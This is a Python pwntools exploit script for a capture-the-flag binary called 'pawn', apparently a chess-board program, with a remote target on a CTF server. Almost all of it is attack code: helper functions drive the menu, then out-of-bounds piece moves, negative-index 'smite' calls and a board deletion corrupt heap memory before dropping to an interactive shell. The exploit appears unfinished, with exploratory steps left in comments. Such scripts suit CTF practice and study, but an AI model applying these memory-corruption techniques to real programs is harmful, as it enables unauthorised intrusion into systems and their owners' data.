#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pawn
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pawn')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('shell.actf.co', 21706)

    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


def menu_choose(choice):
    io.sendlineafter('5) Delete Board\n', str(choice))


def board_choose(idx):
    io.sendlineafter('What is the board index?\n', str(idx))


def piece_choose(ox, oy):
    io.sendlineafter(
        'Please provide the x and y values of the piece, separated by spaces.\n',
        f"{ox} {oy}"
    )


def add_board(idx):
    log.info(f"Adding board #{idx}")
    menu_choose(1)
    board_choose(idx)

    return io.recvline()


def print_board(idx):
    menu_choose(2)
    board_choose(idx)

    return io.recvuntil('y\n').decode()


def move_piece(idx, ox, oy, nx, ny):
    log.info(f"Board #{idx}: Going to move piece from {ox}:{oy} to {nx}:{ny}")
    menu_choose(3)
    board_choose(idx)
    piece_choose(ox, oy)
    io.sendlineafter(
        "Please provide the x and y values of the position to move to, separated by spaces.\n",
        f"{nx} {ny}"
    )
    res = io.recvline()
    if b'Invalid move' in res:
        log.warning("Move was invalid.")
        return 1

    log.info("Move done.")
    return 0


def smite_piece(idx, ox, oy):
    log.info(f"Board #{idx}: Going to smite a piece from {ox}:{oy}")
    menu_choose(4)
    board_choose(idx)
    piece_choose(ox, oy)


def delete_board(idx):
    log.info(f"Deleting board #{idx}")
    menu_choose(5)
    board_choose(idx)

    return io.recvline()


def set_t(idx, t):
    temp_t = 0
    if t % 2:
        move_piece(idx, 0, 1, 0, 2)
        temp_t += 1
    while temp_t < t:
        move_piece(idx, 1, 0, 2, 2)
        move_piece(idx, 2, 2, 1, 0)
        temp_t += 2

    return t

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)

io = start()

add_board(0)
add_board(1)
move_piece(0, 7, 7, 0x9, 7)
move_piece(0, 0x9, 7, 0xa, 7)
for i in range(5):
    smite_piece(0, i+1, 7)

set_t(0, 0x1)
smite_piece(1, -0x57, 0)
move_piece(0, 0, 7, 0x10, 7)
smite_piece(1, -0x58, 0)
delete_board(1)

# smite_piece(0, -8, 0)
# delete_board(0)
# print(print_board(0))
# at x=97 there is R so this is the first pawn on next board
# Q is at x=101
# pause()
# ox, oy = (103, 7)
# for i in range(1, 50):
#     nx, ny = (ox - 2, abs(oy - 1))
#     move_piece(0, ox, oy, nx, ny)
#     ox, oy = nx, ny

# after that loop
# $ 0
# Board 0:
#   01234567-x
# 0 RNBKQBNR
# 1 PPPPPPPP
# 2 ........
# 3 ........|| this is the pawn I have moved from another board
# 4 ........\/
# 5 ........npppppppp
# 6 pppppppp
# 7
# |
# y

io.interactive()
